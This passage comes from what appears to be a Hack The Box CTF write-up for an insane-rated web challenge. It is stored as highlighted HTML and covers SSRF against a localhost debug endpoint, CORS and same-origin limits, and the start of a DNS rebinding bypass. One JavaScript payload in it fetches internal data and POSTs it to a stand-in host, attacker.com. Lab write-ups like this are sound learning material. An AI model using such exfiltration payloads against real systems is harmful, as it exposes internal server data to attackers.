+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// challenge/index.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/debug&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">util&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isLocalhost&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">utils&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;util&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Object&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getOwnPropertyNames&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="sb">`&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">:\n&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">utils&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">inspect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;\n\n&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>When accessed via a GET request from localhost, it responds with a detailed inspection of all properties of the global object in Node.js.
+It&amp;rsquo;s a way to inspect the global environment for debugging purposes.
+In all honesty, at this point I couldn&amp;rsquo;t see how I could leverage this to get the flag, but it seemed like a good step up since I was obtaining higher permissions.
+This is probably something I need to work on for the future.
+This is clearly SSRF, but we can&amp;rsquo;t see the output of the response, so we also need to combine it with a way to exfiltrate the response.
+So then my next thought was to submit a URL I control.
+The URL will contain a webpage that contains a script that will make a request to the &lt;code>/debug&lt;/code> endpoint, and then submit the response from that request back to my own web server.&lt;/p>
+&lt;p>I hosted a web page on an EC2 instance, and had the following script run on it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span> &lt;span class="nx">fetchData&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://localhost/debug&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ok&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Network response was not ok&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">text&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="c1">// Return the response as text
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Error fetching data:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Function to send a POST request to `http://attacker.com/` with the fetched data after a delay of 3 seconds
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">sendDataWithDelay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://attacker.com/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">method&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headers&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;text/plain&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ok&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Network response was not ok&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Data sent successfully&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Error sending data:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span> &lt;span class="mi">3000&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Delay of 3 seconds (3000 milliseconds)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Usage: Fetch data and then send it after a delay of 3 seconds
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fetchData&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">sendDataWithDelay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This somewhat worked, but I wasn&amp;rsquo;t able to receive the request to exfil.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2.png"
+width="681"
+height="54"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="First request received"
+class="gallery-image"
+data-flex-grow="1261"
+data-flex-basis="3026px"
+>&lt;/p>
+&lt;p>This request could have gotten blocked due to the CORS policy, and upon some research it seemed that &lt;code>http.server&lt;/code> does not allow controlling the &lt;code>CORS&lt;/code> header from the commandline.
+However, it is possible with a little scripting and help from &lt;a class="link" href="https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server" target="_blank" rel="noopener"
+>stackoverflow&lt;/a>&lt;/p>
+&lt;p>Then we can verify it worked with burpsuite.
+I blurred out the IP address of my EC2 instance since I don&amp;rsquo;t want it getting touched :).&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3.png"
+width="991"
+height="344"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Initial Request"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="691px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4.png"
+width="588"
+height="195"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Response with CORS policy"
+class="gallery-image"
+data-flex-grow="301"
+data-flex-basis="723px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5.png"
+width="944"
+height="367"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Request to /debug"
+class="gallery-image"
+data-flex-grow="257"
+data-flex-basis="617px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6.png"
+width="550"
+height="103"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Request to /debug received"
+class="gallery-image"
+data-flex-grow="533"
+data-flex-basis="1281px"
+>&lt;/p>
+&lt;p>However, the POST request never went out.
+This was again due to the CORS policy on my local &lt;code>http.server&lt;/code> not havint the correct value, which then made me look into what the CORS and CSP policy was on the actual challenge.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// no XSS or iframing :&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Content-Security-Policy&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sb">`
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> default-src &amp;#39;self&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> style-src &amp;#39;self&amp;#39; https://fonts.googleapis.com;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> font-src https://fonts.gstatic.com;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> object-src &amp;#39;none&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> base-uri &amp;#39;none&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> frame-ancestors &amp;#39;none&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> `&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">trim&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/\s+/g&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-Frame-Options&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;DENY&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">next&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I couldn&amp;rsquo;t find anything to indicate what the CORS policy was so I assumed it was set as the default Same Origin Policy.
+My testing also implied this, so now is the time to think of how to bypass it.&lt;/p>
+&lt;h3 id="cors">CORS
+&lt;/h3>&lt;p>CORS is a policy defined by the web server that determines what requests it will accept.
+If you intercept a response from a web server with a CORS policy you will see the header:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Access-Control-Allow-Origin: *
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This header can have multiple values to specify multiple domains, or a wildcard as shown above, or a &lt;code>null&lt;/code> value.
+It makes sense too because a site that holds private information probably doesn&amp;rsquo;t want to share information to applications outside of its domain.
+Anyways, there are 2 parts to CORS.
+There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request.
+However these only happen when non-standard requests are made I think, or when you need to read the headers or data of the response (TODO: Verify this)&lt;/p>
+&lt;h3 id="sop">SOP
+&lt;/h3>&lt;p>Same Origin Policy is similar to CORS, but it is enforced by the browser.
+This policy just makes it so that a client can only request resources from the same origin, that is the same: &lt;strong>protocal&lt;/strong>, &lt;strong>domain&lt;/strong>, and &lt;strong>port&lt;/strong>.
+For example: a request from &lt;a class="link" href="https://foo.com" target="_blank" rel="noopener"
+>https://foo.com&lt;/a> to &lt;a class="link" href="http://foo.com" target="_blank" rel="noopener"
+>http://foo.com&lt;/a> wouldn&amp;rsquo;t work because there is a different protocol between the two addresses.&lt;/p>
+&lt;h3 id="bypass-1">Bypass 1
+&lt;/h3>&lt;p>So the problem here is that our site, lets call it &lt;code>http://attacker.com&lt;/code> is trying to make a request to &lt;code>http://localhost/debug&lt;/code>, but because the domain, and the port are different then the request is not allowed by the bot&amp;rsquo;s browser.&lt;/p>
+&lt;p>And our goal is for the bot to visit our page, our page sends a request to the local server address of the challenge site, and then our page posts that request to us at another endpoint.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7.png"
+width="681"
+height="580"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="The problem becomes obvious"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="281px"
+>&lt;/p>
+&lt;p>Enter DNS Rebind.
+While searching for bypasses on hacktricks, I came across this method.
+The attack relies on changing the IP address for a domain (rebinding it), very quickly, sort of like a race condition.
+How does that help us here?
+Well in the source code for the bot, we can see that it doensn&amp;rsquo;t perform all its actions immediately, there are delays.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// challenge/bot.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">visit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">puppeteer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">launch&lt;/span>&lt;span class="p">({&lt;/span>
